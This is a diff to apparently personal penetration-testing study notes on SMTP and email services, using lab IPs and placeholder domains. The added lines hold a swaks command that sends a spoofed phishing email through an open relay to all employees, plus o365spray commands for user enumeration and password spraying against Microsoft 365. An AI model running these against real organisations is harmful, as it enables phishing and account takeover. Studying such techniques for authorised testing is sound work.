@@ -329,8 +329,11 @@ mynetworks = 0.0.0.0/0
 ```
 ### Footprinting the Service
 - nmap 
-```
+```shell
 sudo nmap 10.129.14.128 -sC -sV -p25 --script smtp-open-relay
+
+# Next, we can use any mail client to connect to the mail server and send our email.
+swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
 ```
 
 - enum usernames
@@ -360,6 +363,20 @@ telnet 10.129.14.128 25
 | VRFY        | Verifies the existence of a specific email address.    |
 | HELP        | Requests help information from the server.             |
 | STARTTLS    | Initiates a secure connection using TLS encryption.    |
+
+
+### Cloud Enumeration
+- [o365spray](https://github.com/0xZDH/o365spray) for microsoft
+- [MailSniper](https://github.com/dafthack/MailSniper) for microsoft
+- [CredKing](https://github.com/ustayready/CredKing) for gmail and okta 
+
+```shell 
+python3 o365spray.py --validate --domain msplaintext.xyz
+
+python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
+
+python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz 
+```
 
 ## IMAP / POP3
 
